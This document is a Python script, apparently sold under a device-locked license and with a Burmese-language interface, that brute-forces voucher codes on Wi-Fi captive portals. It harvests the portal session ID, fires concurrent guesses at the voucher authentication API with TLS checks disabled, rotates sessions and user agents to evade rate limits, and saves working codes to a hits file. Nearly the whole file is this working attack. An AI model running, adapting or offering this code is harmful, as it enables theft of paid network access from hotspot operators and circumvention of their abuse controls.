#!/usr/bin/env python3
import os
import sys
import json
import time
import random
import string
import sqlite3
import re
import html
import asyncio
import aiohttp
import requests
import urllib3
import hashlib
from urllib.parse import urlparse, parse_qs, urljoin
from rich.console import Console
from rich.layout import Layout
from rich.panel import Panel
from rich.live import Live
from rich.table import Table
from rich.align import Align
from rich.text import Text
from rich.prompt import Prompt, Confirm
from rich.box import ROUNDED

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================
# 🔐 SECURE LICENSE SYSTEM (DEVICE & UNIVERSAL)
# ==========================================
SECRET_SALT = "NewSecureSpider_Salt_2025"
BLACKLIST_FILE = "blacklist.json"
LICENSE_FILE = ".sys_cache.dat"

def load_blacklist():
    if os.path.exists(BLACKLIST_FILE):
        try:
            with open(BLACKLIST_FILE, "r") as f:
                return json.load(f)
        except: return []
    return []

def get_device_id():
    try:
        android_id = os.popen("settings get secure android_id").read().strip()
        if android_id and "Failure" not in android_id and len(android_id) > 5:
            return android_id.upper()
    except: pass
    
    try:
        mac = os.popen("cat /sys/class/net/wlan0/address").read().strip()
        if mac and "No such" not in mac and len(mac) > 5:
            return mac.replace(":", "").upper()
    except: pass

    id_file = os.path.expanduser("~/.my_device_id")
    if os.path.exists(id_file):
        try:
            with open(id_file, "r") as f:
                return f.read().strip().upper()
        except: pass
    
    new_id = "DEV-" + str(random.randint(100000, 999999))
    try:
        with open(id_file, "w") as f:
            f.write(new_id)
    except: pass
    return new_id

def verify_license():
    blacklist = load_blacklist()
    dev_id = get_device_id()

    if os.path.exists(LICENSE_FILE):
        try:
            with open(LICENSE_FILE, "r") as f:
                saved_data = f.read().strip()
            
            parts = saved_data.split("|")
            if len(parts) == 2:
                saved_key = parts[0]
                saved_dev = parts[1]
                
                if saved_key in blacklist:
                    console.print("[bold red]❌ ဒီ Key ကို ဖြတ်တောက်ထားပါတယ်။[/bold red]")
                    return False

                # Universal Key ဖြစ်နေရင် Device ID မစစ်ဘူး
                if not saved_key.startswith("ALL-"):
                    if saved_dev != dev_id:
                        console.print("[bold red]❌ ဒီ Key က ဒီဖုန်းအတွက် မဟုတ်ပါဘူး။[/bold red]")
                        return False
                
                key_parts = saved_key.split("-")
                if len(key_parts) >= 3:
                    exp_str = key_parts[-1]
                    if exp_str.isdigit():
                        expiry = int(exp_str)
                        if time.time() < expiry:
                            return True
        except Exception: pass

    clear_screen()
    console.print(Panel(Align.center(Text("🔒 ACTIVATION REQUIRED", style="bold red")), border_style="red", box=ROUNDED))
    console.print(f"[yellow]📱 သင့်ဖုန်းရဲ့ Device ID: [bold cyan]{dev_id}[/bold cyan][/yellow]")
    console.print("[yellow](ဒီ ID ကို Key ထုတ်ပေးသူဆီ ပို့ပါ)[/yellow]\n")
    
    user_key = input("[yellow]➜ Enter your Key: [/yellow]").strip()

    if user_key in blacklist:
        console.print("[bold red]❌ ဒီ Key ကို ဖြတ်တောက်ထားပါတယ်။[/bold red]")
        return False

    try:
        key_parts = user_key.split("-")
        if len(key_parts) >= 3:
            key_dev = key_parts[0].upper()
            exp_str = key_parts[-1]
            
            if not exp_str.isdigit():
                console.print("[bold red]❌ Key ပုံစံ မှားနေပါတယ်။[/bold red]")
                return False
                
            expiry = int(exp_str)
            
            # Universal Key မဟုတ်ရင် Device ID ကိုက်ညီမှုစစ်မယ်
            if key_dev != "ALL":
                if key_dev != dev_id:
                    console.print("[bold red]❌ ဒီ Key က ဒီဖုန်းအတွက် မဟုတ်ပါဘူး။[/bold red]")
                    return False

            if time.time() < expiry:
                with open(LICENSE_FILE, "w") as f:
                    f.write(f"{user_key}|{dev_id}")
                console.print("[bold green]✅ Key မှန်ကန်ပါသည်။ Activation အောင်မြင်ပါသည်။[/bold green]")
                time.sleep(1.5)
                return True
            else:
                console.print("[bold red]❌ Key သက်တမ်း ကုန်သွားပါပြီ။[/bold red]")
        else:
            console.print("[bold red]❌ Key ပုံစံ မှားနေပါတယ်။[/bold red]")
    except Exception:
        console.print("[bold red]❌ Key မှားနေပါတယ်။[/bold red]")
    time.sleep(2)
    return False

# ==========================================
# 🚀 MAIN SCANNER CODE
# ==========================================
DB_FILE = "scanner_data.db"
STATE_FILE = "scanner_state.json"
HITS_FILE = "hits.txt"
CONCURRENCY = 20 
TIMEOUT = 8
BASE_SLEEP_MIN = 0.10
BASE_SLEEP_MAX = 0.30
RATE_LIMIT_SLEEP = 30
NETWORK_RETRY_SLEEP = 3.0
SESSION_COOLDOWN = 10

USER_AGENTS = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36"]

console = Console()
session = requests.Session()
session.headers.update({"User-Agent": random.choice(USER_AGENTS)})

stats = {'tested': 0, 'hits': [], 'status': 'Waiting...', 'current_code': '----', 'session_uses': 0}
stop_event = None

def clear_screen():
    try: os.system('cls' if os.name == 'nt' else 'clear')
    except Exception: pass

def format_time(seconds):
    try:
        seconds = int(seconds)
        h = seconds // 3600; m = (seconds % 3600) // 60; s = seconds % 60
        return f"{h:02d}:{m:02d}:{s:02d}"
    except Exception: return "00:00:00"
def normalize_hits(hits):
    if not hits: return []
    result = []
    for h in hits:
        if isinstance(h, dict): result.append({"code": h.get("code", ""), "time": h.get("time", "--:--:--")})
        elif isinstance(h, str): result.append({"code": h, "time": "--:--:--"})
    return result

def hits_codes_only(hits):
    return [h.get("code") if isinstance(h, dict) else h for h in hits]

def init_db():
    try:
        conn = sqlite3.connect(DB_FILE, timeout=10)
        conn.execute('CREATE TABLE IF NOT EXISTS tried_codes (code TEXT PRIMARY KEY)')
        conn.commit(); return conn
    except Exception: return None

def is_tried(conn, code):
    if conn is None: return False
    try: return conn.execute("SELECT 1 FROM tried_codes WHERE code=?", (code,)).fetchone() is not None
    except Exception: return False

def mark_tried(conn, code):
    if conn is None: return
    try:
        conn.execute("INSERT OR IGNORE INTO tried_codes (code) VALUES (?)", (code,))
        conn.commit()
    except Exception: pass

def load_state():
    try:
        with open(STATE_FILE) as f: return json.load(f)
    except Exception: return None

def save_state(mode, tested, hits):
    try:
        with open(STATE_FILE, "w") as f:
            json.dump({"mode": mode, "tested": tested, "hits": hits}, f)
    except Exception: pass

def clear_state():
    try: os.remove(STATE_FILE)
    except Exception: pass

def extract_session(value):
    if not value: return None
    try: value = html.unescape(value)
    except Exception: pass
    try:
        q = parse_qs(urlparse(value).query)
        for k, v in q.items():
            if k.lower() == "sessionid" and v: return v[0]
    except Exception: pass
    try:
        m = re.search(r"sessionId=([a-zA-Z0-9]+)", value, re.IGNORECASE)
        return m.group(1) if m else None
    except Exception: return None

def fetch_session():
    probes = ["http://connectivitycheck.gstatic.com/generate_204", "http://captive.apple.com/hotspot-detect.html"]
    for url in probes:
        try:
            r = session.get(url, timeout=10, allow_redirects=True, verify=False)
        except Exception: continue
        try:
            p = urlparse(r.url)
            if "gstatic.com" in p.netloc or "apple.com" in p.netloc: continue
            portal_base = f"{p.scheme}://{p.netloc}"
            cands = [r.url, r.text]
            cands.extend(h.headers.get("Location", "") for h in r.history)
            cands.extend(h.url for h in r.history)
            for c in cands:
                sid = extract_session(c)
                if sid: return portal_base, sid
            try:
                m = re.search(r"(?:self|window)\.location\.href\s*=\s*['\"]([^'\"]+)['\"]", r.text)
                if m:
                    nxt = urljoin(r.url, m.group(1))
                    r2 = session.get(nxt, timeout=10, allow_redirects=True, verify=False)
                    sid = extract_session(r2.url) or extract_session(r2.text)
                    if sid: return portal_base, sid
            except Exception: pass
        except Exception: continue
    return None, None

def _deep_search_hit(data, depth=0, _context=None):
    if depth > 20 or not isinstance(data, dict): return None
    if _context is None:
        _context = {'logon_url': '', 'profile': '', 'total_min': 0, 'auth_result': None, 'welcome': '', 'success': None}
    URL_KEYS = {'logonurl', 'loginurl', 'redirecturl', 'url', 'targeturl', 'location', 'href', 'logon', 'login', 'nexturl', 'authurl'}
    PROFILE_KEYS = {'profilename', 'profile', 'username', 'user', 'name', 'plan', 'account', 'accountname'}
    MIN_KEYS = {'totalminutes', 'minutes', 'balance', 'time', 'duration', 'remainingminutes', 'remainminutes'}
    AUTH_KEYS = {'authresult', 'authres', 'resultcode', 'result'}
    SUCCESS_KEYS = {'success', 'ok', 'valid', 'auth'}
    for key, val in data.items():
        if not isinstance(key, str): continue
        kl = key.lower().replace(' ', '').replace('_', '').replace('-', '')
        if kl in {k.replace('_', '') for k in AUTH_KEYS}:
            if _context['auth_result'] is None: _context['auth_result'] = val
            continue
        if kl in {k.replace('_', '') for k in SUCCESS_KEYS}:
            if _context['success'] is None and isinstance(val, (bool, int)): _context['success'] = val
            continue
        if kl in {k.replace('_', '') for k in URL_KEYS}:
            if isinstance(val, str) and val.strip():
                if not _context['logon_url']: _context['logon_url'] = val.strip()
            continue
        if kl in {k.replace('_', '') for k in PROFILE_KEYS}:
            if isinstance(val, (str, int)) and val:
                s = str(val).strip()
                if s and not s.startswith(('http', '/')) and not _context['profile']: _context['profile'] = s
            continue
        if kl in {k.replace('_', '') for k in MIN_KEYS}:
            try:
                v = int(val or 0)
                if v > _context['total_min']: _context['total_min'] = v
            except (ValueError, TypeError): pass
            continue
    for val in data.values():
        if isinstance(val, dict): _deep_search_hit(val, depth + 1, _context)
        elif isinstance(val, list):
            for item in val:
                if isinstance(item, dict): _deep_search_hit(item, depth + 1, _context)
    if depth != 0: return None
    is_hit = False; reasons = []
    ar = _context['auth_result']
    if ar is not None:
        ar_str = str(ar).strip().lower()
        if ar_str in ('1', 'true', 'yes', 'success', 'ok'): is_hit = True; reasons.append(f'authResult={ar}')
    succ = _context['success']
    if succ is True or succ == 1: is_hit = True; reasons.append('success=true')
    lu = _context['logon_url']
    if lu and len(lu) > 20:
        lu_low = lu.lower()
        if 'sessionid' in lu_low and ('http' in lu_low or '/webauth' in lu_low):
            ar_str = str(ar).strip().lower() if ar is not None else ''
            if ar_str not in ('2', '-1', 'false', 'expired', 'fail', 'error'): is_hit = True; reasons.append('logonUrl')
    if _context['profile'] and _context['total_min'] > 0: is_hit = True; reasons.append('profile+min')
    if not is_hit: return None
    return {'is_hit': True, 'logon_url': _context['logon_url'], 'profile': _context['profile'], 'total_min': _context['total_min'], 'auth_result': _context['auth_result'], 'success': succ, 'raw': data, 'reason': ' | '.join(reasons)}

def classify_response(data, raw_text=''):
    if data is None: return ('error', None)
    if isinstance(data, str):
        t = data.lower()
        if not t.strip(): return ('error', None)
        m = re.search(r'sessionId[=:"\']+([A-Za-z0-9_-]{6,})', data, re.I)
        if m: return ('hit', {'is_hit': True, 'logon_url': data[:200], 'profile': '', 'total_min': 0, 'auth_result': None, 'raw': data, 'reason': 'html-sid'})
        if any(x in t for x in ('limit', 'exceed', 'too many', 'frequency')): return ('limit', None)
        if any(x in t for x in ('expired', 'out of date')): return ('expired', None)
        try:
            start = data.find('{'); end = data.rfind('}') + 1
            if start >= 0 and end > start: data = json.loads(data[start:end])
        except Exception: return ('wrong', None)
    if not isinstance(data, dict): return ('wrong', None)
    if not data: return ('error', None)
    hit_info = _deep_search_hit(data, 0, None)
    if hit_info and hit_info['is_hit']: return ('hit', hit_info)
    ar_val = None
    def find_ar(d):
        nonlocal ar_val
        if not isinstance(d, dict): return
        for k, v in d.items():
            if isinstance(k, str) and k.lower().replace('_','') in ('authresult','authres','resultcode'):
                if ar_val is None: ar_val = v; return
            if isinstance(v, dict): find_ar(v)
    find_ar(data)
    if ar_val is not None:
        ar_str = str(ar_val).strip().lower()
        if ar_str == '2': return ('expired', None)
        if ar_str == '-1': return ('error', None)
        return ('wrong', None)
    success = data.get('success')
    if success is False or success == 0: return ('wrong', None)
    if success is True or success == 1: return ('expired', None)
    msgs = []
    for k in ('message', 'msg', 'error', 'info'):
        v = data.get(k)
        if v: msgs.append(str(v).lower())
    all_msg = ' '.join(msgs)
    if any(x in all_msg for x in ('limit', 'exceed', 'too many', 'frequency')): return ('limit', None)
    if any(x in all_msg for x in ('expired', 'out of date')): return ('expired', None)
    if any(x in all_msg for x in ('not found', 'invalid', 'wrong', 'fail', 'error')): return ('wrong', None)
    return ('wrong', None)

async def async_test_code(portal_base, session_id, code):
    url = f"{portal_base}/api/auth/voucher/?lang=en_US"
    headers = {"Content-Type": "application/json", "Origin": portal_base, "User-Agent": random.choice(USER_AGENTS)}
    payload = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": "ABCD"}
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.post(url, json=payload, headers=headers, ssl=False, timeout=TIMEOUT) as resp:
                try: data = await resp.json()
                except: data = await resp.text()
                return resp.status, data
    except Exception: return 0, None

def gen_code(mode, length):
    if mode == "num": return str(random.randint(0, 10**length - 1)).zfill(length)
    if mode == "eng": return ''.join(random.choices(string.ascii_lowercase, k=length))
    if mode == "mix": return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    return ""
def make_layout(mode_name, current_code, tested, elapsed, status, hits, running_logs, session_uses):
    layout = Layout()
    layout.split_column(Layout(name="header", size=4), Layout(name="live", size=3), Layout(name="console_logs", ratio=2), Layout(name="hits", ratio=2))
    title = Text("🕷️  Ultimate Scanner (Boosted)  🕷️", style="bold magenta", justify="center")
    sub = Text(f"⚠️  Speed: High | Session Uses: {session_uses}/18  ⚠️", style="bold yellow", justify="center")
    layout["header"].update(Panel(Align.center(Text.assemble(title, "\n", sub)), border_style="cyan", box=ROUNDED))
    if status == "Active": s_disp = Text("Active", style="bold green", justify="center")
    elif status == "Waiting": s_disp = Text("Wait SID", style="bold yellow", justify="center")
    elif status == "Limit": s_disp = Text("Limit", style="bold red", justify="center")
    else: s_disp = Text("--", style="bold yellow", justify="center")
    live_grid = Table.grid(padding=0, expand=True)
    live_grid.add_column(ratio=3)
    live_grid.add_column(ratio=2)
    live_grid.add_column(ratio=2)
    live_grid.add_column(ratio=2)
    live_grid.add_row(
        Panel(Align.center(Text(current_code if current_code else "----", style="bold green")), title="🔍 Code", border_style="green", box=ROUNDED),
        Panel(Align.center(Text(elapsed, style="bold cyan")), title="⏱ Time", border_style="cyan", box=ROUNDED),
        Panel(Align.center(Text(f"{tested:,}", style="bold yellow")), title="📊 Tested", border_style="yellow", box=ROUNDED),
        Panel(Align.center(s_disp), title="⚡ Status", border_style="magenta", box=ROUNDED),
    )
    layout["live"].update(live_grid)
    log_table = Table(show_header=False, expand=True, box=None, padding=0)
    log_table.add_column("Logs")
    for lg in running_logs[-7:]: log_table.add_row(lg)
    if not running_logs: log_table.add_row("[dim]Waiting for session...[/dim]")
    layout["console_logs"].update(Panel(log_table, title="💻 Live Code Scanning Logs", border_style="green", box=ROUNDED))
    hits_table = Table(show_header=True, header_style="bold magenta", expand=True, box=ROUNDED)
    hits_table.add_column("No.", width=5, justify="center")
    hits_table.add_column("Valid Code")
    hits_table.add_column("Time", width=10, justify="center")
    last_hits = hits[-10:]
    for i, h in enumerate(last_hits, 1):
        c = h.get("code", "") if isinstance(h, dict) else h
        t = h.get("time", "--:--:--") if isinstance(h, dict) else "--:--:--"
        hits_table.add_row(str(i), f"[bold green]{c}[/bold green]", f"[dim cyan]{t}[/dim cyan]")
    if not last_hits: hits_table.add_row("", "[dim]No hits yet...[/dim]", "")
    hits_title = f"🎯 Hits ({len(hits)})"
    if len(hits) > 10: hits_title += " — showing last 10"
    layout["hits"].update(Panel(hits_table, title=hits_title, border_style="yellow", box=ROUNDED))
    return layout

async def scan_worker(mode, length, portal_base, session_id, conn):
    code = gen_code(mode, length)
    if not code or is_tried(conn, code): return None
    mark_tried(conn, code)
    stats['current_code'] = code
    stats['tested'] += 1
    stats['status'] = "Active"
    status_code, data = await async_test_code(portal_base, session_id, code)
    if status_code == 0: return "NET_ERROR"
    classification, hit_info = classify_response(data)
    if classification == 'hit':
        existing = hits_codes_only(stats['hits'])
        if code not in existing:
            now = time.strftime("%H:%M:%S")
            stats['hits'].append({"code": code, "time": now})
            try:
                with open(HITS_FILE, "a", encoding="utf-8") as f:
                    f.write(f"[{now}] CODE: {code}\n")
            except Exception: pass
        return "HIT"
    elif classification == 'limit': return "LIMIT"
    elif classification == 'expired': return "SESSION_DEAD"
    else: return "WRONG"

async def async_scan_loop(mode, length, start_tested=0, start_hits=None):
    global stop_event
    stop_event = asyncio.Event()
    mode_name = f"{mode.upper()} {length}"
    stats['tested'] = start_tested
    stats['hits'] = normalize_hits(start_hits) if start_hits else []
    conn = init_db()
    running_logs = []
    start_time = time.time()
    session_uses = 0
    net_error_streak = 0
    session_id = None
    portal_base = None
    initial = make_layout(mode_name, "----", stats['tested'], "00:00:00", "Waiting", stats['hits'], running_logs, session_uses)
    live = Live(initial, refresh_per_second=2, screen=True)
    live.start()
    def push_log(msg):
        t_str = time.strftime("%H:%M:%S")
        running_logs.append(f"[dim]{t_str}[/dim] {msg}")
    try:
        while not stop_event.is_set():
            if not session_id or session_id == "dummy":
                stats['status'] = "Waiting"
                live.update(make_layout(mode_name, "----", stats['tested'], format_time(time.time() - start_time), "Waiting", stats['hits'], running_logs, session_uses))
                push_log("[yellow]🔍 Session ရှာနေသည်...[/yellow]")
                portal_base, session_id = await asyncio.to_thread(fetch_session)
                if not session_id:
                    push_log("[red]❌ Session မရပါ။ ၅ စက္ကန့်နေပြီး ပြန်ရှာမည်။[/red]")
                    await asyncio.sleep(5)
                    continue
                session_uses = 0
                net_error_streak = 0
                push_log("[green]✅ Session ရပါပြီ။ စတင်ရှာမည်။[/green]")
            tasks = []
            for _ in range(CONCURRENCY):
                tasks.append(scan_worker(mode, length, portal_base, session_id, conn))
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for res in results:
                if res == "NET_ERROR":
                    net_error_streak += 1
                    if net_error_streak >= 5:
                        session_id = None
                        push_log("[red]❌ Network Error အများကြီး။ Session ပြန်ရှာမည်။[/red]")
                        break
                elif res == "LIMIT":
                    push_log("[red]🚫 Rate Limit မိသည်။ ၃၀ စက္ကန့် နားမည်။[/red]")
                    await asyncio.sleep(RATE_LIMIT_SLEEP)
                    session_id = None
                    break
                elif res == "SESSION_DEAD":
                    session_id = None
                    push_log("[yellow]⏰ Session သက်တမ်းကုန်သည်။ အသစ်ရှာမည်။[/yellow]")
                    break
                elif res == "HIT":
                    push_log(f"[bold green]🎉 Valid Code တွေ့သည်![/bold green]")
            if session_id:
                session_uses += 1
                if session_uses >= 18:
                    push_log("[cyan]🔄 Session ၁၈ ခါ ပြည့်သည်။ အသစ်လဲမည်။[/cyan]")
                    session_id = None
            live.update(make_layout(mode_name, stats['current_code'], stats['tested'], format_time(time.time() - start_time), stats['status'], stats['hits'], running_logs, session_uses))
            await asyncio.sleep(0.3)
    except KeyboardInterrupt: pass
    finally: live.stop()

def show_banner():
    clear_screen()
    console.print(Panel(Align.center(Text("🕷️  Ultimate Scanner (Boosted)  🕷️", style="bold magenta")), border_style="magenta", box=ROUNDED))
    console.print(Panel(Align.center(Text("⚡ Speed နဲ့ Test Logic ကို မြှင့်တင်ထားသည် ⚡", style="bold yellow")), border_style="yellow", box=ROUNDED))

def ask_mode():
    while True:
        show_banner()
        try:
            menu = Text("\n  [1] 🔢 NUM\n  [2] 🔤 ENG\n  [3] 🔀 MIX\n  [0] 🚪 BACK\n", style="bold cyan")
            console.print(Panel(menu, title="Mode ရွေးပါ", border_style="cyan", box=ROUNDED))
            choice = Prompt.ask("[bold cyan]➜ ရွေးချယ်ပါ[/bold cyan]").strip()
        except KeyboardInterrupt: raise
        except Exception: return None
        if choice == "0": return None
        if choice not in ("1", "2", "3"): continue
        return {"1": "num", "2": "eng", "3": "mix"}[choice]

def ask_length(mode):
    while True:
        clear_screen()
        try:
            menu = Text("\n  [6] 6 Characters\n  [7] 7 Characters\n  [8] 8 Characters\n  [9] 9 Characters\n  [0] BACK\n", style="bold cyan")
            console.print(Panel(menu, title="အရှည် ရွေးပါ", border_style="cyan", box=ROUNDED))
            length = Prompt.ask("[bold cyan]➜ အရှည်[/bold cyan]").strip()
        except KeyboardInterrupt: raise
        except Exception: return None
        if length == "0": return None
        if length not in ("6", "7", "8", "9"): continue
        return int(length)

def run():
    state = load_state()
    if state:
        try:
            m, l = state["mode"].split("_")
            tested = state.get("tested", 0)
            hits = normalize_hits(state.get("hits", []))
            clear_screen()
            console.print(Panel(Align.center(Text("💾  ရှာလက်စ အခြေအနေ တွေ့ပါတယ်", style="bold yellow")), border_style="yellow", box=ROUNDED))
            info = Text()
            info.append("  🎯 Mode    : ", style="cyan"); info.append(f"{m.upper()} {l}\n", style="bold white")
            info.append("  📊 Tested  : ", style="cyan"); info.append(f"{tested:,}\n", style="bold white")
            info.append("  🎁 Hits    : ", style="cyan"); info.append(f"{len(hits)}\n", style="bold green")
            console.print(Panel(info, title="လက်ရှိ အခြေအနေ", border_style="green", box=ROUNDED))
            console.print()
            if Confirm.ask("[bold yellow]➜ ဒီအတိုင်း ဆက်ရှာမလား? (y/n)[/bold yellow]", default=True):
                asyncio.run(async_scan_loop(m, int(l), start_tested=tested, start_hits=hits))
                return
            else: clear_state()
        except KeyboardInterrupt: raise
        except Exception: clear_state()

    while True:
        mode = ask_mode()
        if mode is None: return
        length = ask_length(mode)
        if length is None: continue
        asyncio.run(async_scan_loop(mode, length))
        return

def main():
    try:
        if not verify_license(): return 
        run()
    except KeyboardInterrupt: pass
    except BaseException: pass
    finally:
        try: clear_screen()
        except BaseException: pass
        try:
            bye = Text("\n\n👋  See you my friend. Saw shi lar.  ✨", style="bold green")
            console.print(Align.center(bye))
            time.sleep(2)
        except BaseException: pass

if __name__ == "__main__":
    main()